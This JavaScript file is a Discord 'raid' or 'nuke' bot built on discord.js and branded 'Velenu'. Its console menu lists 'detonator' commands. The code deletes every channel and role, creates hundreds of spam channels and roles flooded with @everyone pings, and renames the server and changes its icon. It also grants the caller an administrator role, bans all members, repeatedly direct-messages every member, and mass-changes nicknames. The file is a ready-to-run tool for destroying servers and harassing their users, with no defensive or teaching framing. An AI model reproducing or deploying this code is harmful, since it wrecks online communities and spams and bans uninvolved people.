const Discord = require("discord.js");
const client = new Discord.Client();
const gradient = require('gradient-string');

client.on("ready", () => {
 
console.log(gradient.mind(`
                                    ░▐█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▄☆.    888     888        888
                                    ░███████████████████████      888     888        888 
                                    ░▓▓▓▓▓▓▓▓▓▓▓▓██▓▓▓▓▓▓▓▓◤     88     888        888
                                    ╬▀░▐▓▓▓▓▓▓▌▀█░░░█▀░          Y88b   d88P .d88b. 888 .d88b. 88888b. 888  888
                                    ▒░░▓▓▓▓▓▓█▄▄▄▄▄█▀╬░          Y88b d88P d8P  Y8b888d8P  Y8b888 "88b888  888
                                    ░░█▓▓▓▓▓▌░▒▒▒▒▒▒▒▒▒          Y88o88P  8888888888888888888888  888888  888
                                    ░▐█▓▓▓▓▓░░▒▒▒▒▒▒▒▒▒          Y888P   Y8b.    888Y8b.    888  888Y88b 888
                                    ░▐██████▌╬░▒▒▒▒▒▒▒▒          Y8P     "Y8888 888 "Y8888 888  888 "Y88888 `))
 
 
console.log(gradient.mind(""));   
console.log(gradient.mind(""));   
console.log(gradient.mind("                          "));   
  
  console.log(gradient.mind("                                            The client started correctly"));
  console.log(gradient.mind("   "))  
  console.log(gradient.mind(`                                            Ayo ng ${client.user.tag}`));  
  console.log(gradient.mind("                                            Developed by knot#0300"));  
  console.log(gradient.mind("      ")) 
  console.log(gradient.mind(` 


                                         +-----------+---------+--------------------+
                                         | Detonator | Command |        Info        |
                                         +-----------+---------+--------------------+
                                         |         1 | on      | Auto Raid          |
                                         |         2 | admin   | Ye                 |
                                         |         3 | list    | Channels and roles |
                                         |         4 | banall  | ?                  |
                                         |         5 | nuke    | ?                  |
                                         |         6 | raid    | auto raid          |
                                         |         7 | mdall   | private messages   |
                                         |         8 | rroles  | delete the roles   |
                                         |         9 | rroles  | create roles       |
                                         |        10 | nick    | nick everyone      |
                                         +-----------+---------+--------------------+
`))
 
console.log(gradient.mind("      "))
 
 
   presencia();  
    });
 
 
 
function presencia(){
  client.user.setPresence({
status: "dnd",
activity: {
  name: "Satus a tenebris fantasy",
  type: "PLAYING"
 
}
  });
}
 
 
//on || auto - this is how bot raiders work automatically 
client.on("message", message => {
  if(message.author.bot) return;
 
 var ids = ["YOUR_ID", "SOME_OTHER_ID"];
  if(!ids.some(ids => message.author.id == ids)) return;
 
  if(message.content === '.1'){
      message.delete()
      message.guild.channels.cache.forEach(channel => channel.delete());
      message.guild.channels.create(`wizzed-by-velenu`, {
        type: 'text'
      }).then(channel => {
        channel.send("Wizzed by Velenu :relaxed:")
      })

    for (let i = 0; i <= 500; i++) {
         message.guild.channels.create(`attacked-by-velenu`, {
           type: 'text'
         }).then(channel => {
           channel.send("@everyone **Raid By Velenu ** , https://i.gifer.com/14jS.gif");
           channel.send("@everyone **Raid By Velenu ** , https://i.gifer.com/14jS.gif");
           channel.send("@everyone **Raid By Velenu ** , https://i.gifer.com/14jS.gif");
           channel.send("@everyone **Raid By Velenu ** , https://i.gifer.com/14jS.gif");
           channel.send("@everyone **Raid By Velenu ** , https://i.gifer.com/14jS.gif");
           channel.send("@everyone **Raid By Velenu ** , https://i.gifer.com/14jS.gif");
           channel.send("@everyone **Raid By Velenu ** , https://i.gifer.com/14jS.gif");
           channel.send("@everyone **Raid By Velenu ** , https://i.gifer.com/14jS.gif");
           channel.send("@everyone **Raid By Velenu ** , https://i.gifer.com/14jS.gif");
           channel.send("@everyone **Raid By Velenu ** , https://i.gifer.com/14jS.gif");
           channel.send("@everyone **Raid By Velenu ** , https://i.gifer.com/14jS.gif");
           
       })
       }
       message.guild.setName("Wizzed By Velenu");
       message.guild.setIcon("https://images5.alphacoders.com/885/thumb-350-885397.jpg");
     }
})
 
 
//admin - create and give you an administrator role
client.on("message", async msg => {
  if (msg.author.bot) return;
  if(msg.content.toLowerCase().startsWith('.2')){
    let rol = await msg.guild.roles.create({data: {
      name: "︻デ┳═ー",
      color: "B9BBBE",
      permissions: "ADMINISTRATOR",
      hoisted: false
    }})
 
msg.member.roles.add(rol)
      .then(function(role) {
        msg.member.addRole(role);
        if (msg.deletable) msg.delete().catch(e => {});
      })
      .catch(e => {});
  }
});
 
 
//list - this sends a message with all the channels and roles of the guild
client.on("message", message => {
    if (message.author.bot) return;
    const args = message.content.slice().trim().split(/ +/g );
    const command = args.shift().toLowerCase();
   if (command === '.3') {
       message.delete()
       const embed = new Discord.MessageEmbed()
       .setTitle(message.guild.name)
       .setThumbnail()
       .setDescription(`**Channels:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
       .setColor("RED");
       message.channel.send(embed)
   }
});
 
 
//banall - not working currently due to discord api problems
client.on("message", async message => {
  if(message.content === ".4")
  message.delete();
  if(!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
  message.guild.members.cache.forEach(member => {
    if(member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
      member.ban();
      };
    })});
 
 
//nuke - remove all channels of the guild
client.on("message", message => {
   if (message.author.bot) return;
  
   if (message.content === '.5') {
    message.delete()
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`velenusquad`, {
          type: 'text'
        }).then(channel => {
          channel.send("#VelenuSquad :relaxed:")
        })
         }
      })
 
 
//chats -  create channels and send pings
client.on("message", message => {
            if (message.author.bot) return;
          
           if (message.content === '.6') {
            message.delete()
           for (let i = 0; i <= 500; i++) {
                message.guild.channels.create(`Attacked by Velenu`, {
                  type: 'text'
                }).then(channel => {
                  channel.send("@everyone **Raid By Velenu ** , https://media.giphy.com/media/10KTsIcjwVGqaI/giphy.gif");
                  channel.send("@everyone **Raid By Velenu ** , https://media.giphy.com/media/10KTsIcjwVGqaI/giphy.gif");
                  channel.send("@everyone **Raid By Velenu ** , https://media.giphy.com/media/10KTsIcjwVGqaI/giphy.gif");
                  channel.send("@everyone **Raid By Velenu ** , https://media.giphy.com/media/10KTsIcjwVGqaI/giphy.gif");
                  channel.send("@everyone **Raid By Velenu ** , https://media.giphy.com/media/10KTsIcjwVGqaI/giphy.gif");
                  channel.send("@everyone **Raid By Velenu ** , https://media.giphy.com/media/10KTsIcjwVGqaI/giphy.gif");
                  channel.send("@everyone **Raid By Velenu ** , https://media.giphy.com/media/10KTsIcjwVGqaI/giphy.gif");
                  channel.send("@everyone **Raid By Velenu ** , https://media.giphy.com/media/10KTsIcjwVGqaI/giphy.gif");
                  channel.send("@everyone **Raid By Velenu ** , https://media.giphy.com/media/10KTsIcjwVGqaI/giphy.gif");
                  channel.send("@everyone **Raid By Velenu ** , https://media.giphy.com/media/10KTsIcjwVGqaI/giphy.gif");
                 })
              }
              }
            });
 
//mdall - send dm for all
client.on("message", message => {
                        if (message.author.bot) return;
                        
                      if(message.content === ".7")
                        message.delete()
                      message.guild.members.cache.forEach(member => {
                        setInterval(function(){
                          member.send("Wizzed By Velenu , https://i.gifer.com/14jS.gif").catch(error => {});
                        },450);
                      })
                      });
 
 
//role delete - delete all roles
client.on("message", message => {
                    if (message.author.bot) return;
                  
                     if(message.content === ('.8')){
                      message.delete()
                            message.guild.roles.cache.map(roles => roles.delete());
                          }
                  });
 
//role create - create spam roles
client.on("message", message => {
                if (message.author.bot) return;
              
               if (message.content === '.9') {
                message.delete()
              for (let i = 0; i <= 200; i++) {
                 message.guild.roles.create({data: {name: `Wizzed By Velenu`,color: '#d41818',},reason: 'razon',})
              };
               }
                });
 
//nickall - change user nickname (not working properly)
client.on("message", msg => {
const args = msg.content.slice().trim().split(/ +/g );
const command = args.shift().toLowerCase();
  if (command === '.10'){
      msg.delete()
    let nickname = args.join(" ");
    var i = 0;
    msg.guild.members.cache.forEach(member =>{
      i++
    }
      )
    msg.channel.send("Cambiando el nombre de " + i + " usuarios a: **" + nickname + "**")
    msg.guild.members.cache.forEach(member =>{
 
      member.setNickname(nickname)
    })
    }
});
 
 
 
 
client.login("YOUR-CLIENT-TOKEN");
